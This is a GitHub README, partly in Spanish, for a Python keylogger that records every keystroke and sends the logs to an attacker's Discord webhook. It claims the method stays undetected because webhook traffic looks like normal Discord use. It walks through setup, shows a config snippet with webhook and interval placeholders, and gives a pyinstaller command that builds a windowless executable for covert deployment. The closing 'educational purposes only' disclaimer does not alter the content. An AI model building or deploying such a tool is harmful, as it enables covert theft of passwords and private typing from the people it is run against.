# KLPDISC
KeyLogger creado para el proyecto final de la materia.


# Keylogger que reporta a Discord #

Este script de python capturara todas las teclas apretadas durante una ventana de tiempo predefinida y las reportara a un servidor de Discord por medio de Webhooks. a diferencia de los metodos tradicionales como "Guardar en un txt" o "Enviar a un email", este metodo permanece indetectado ya que los request de webhook son considerados trafico normal de Discord.

![image](https://i.ibb.co/LrkQPc3/keylogger.png)

## Deployment

Tener Python instalado en su maquina, descargar el lenguaje desde [aqui](https://www.python.org/downloads/).


## Instalar librerias requeridas
```
python -m pip install -r requirements.txt
```

## Crear un servidor de Discord

Puedes usar [este](https://support.discord.com/hc/en-us/articles/204849977-How-do-I-create-a-server-) articulo para ver como hacerlo.

## Create a Discord Webhook

Got to your servers settings select Intergrations >> Webhooks and create a new Webhook. You can also customize it and give it a name and a featured icon. Make sure to copy the URL, you will need it later.

![screenshot](https://i.ibb.co/0JWHdWz/Capture.png)

## Edit keylogger.py
Its time to edit the python script. Now that you have the Webhook URL, you can add that to the file. Also make sure to add your desired timeframe that they keylogger will report to you. You have to add the time in seconds so you can use [this](https://www.calculatorsoup.com/calculators/conversions/time.php) converter to get the correct time in seconds.

```Python
import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
WEBHOOK = "WEBHOOK_URL_HERE"
```

## Execute the script

You are now ready to test the script and see whether if it works or not. If you are having problems with the script please open a new ticket on the issues tab and i will try to help you.

To execute the script all you have to do is run:
```
python keylogger.py
```
If all goes right, you should see a report on discord after the seconds you have specified on the script have passed.
![rick](https://i.ibb.co/ckF9jbk/rick.png)

## Compile the script

Now what if you want to turn this into an executable? You can do that with the pyinstaller library that was included in the requirements.txt file.
```
pyinstaller PATH_TO_SCRIPT --onefile --noconsole
```
## ⚠️ DISCLAIMER ⚠️

**I am not responsible for any of your actions. This GitHub repository is made for educational purposes only!!!**
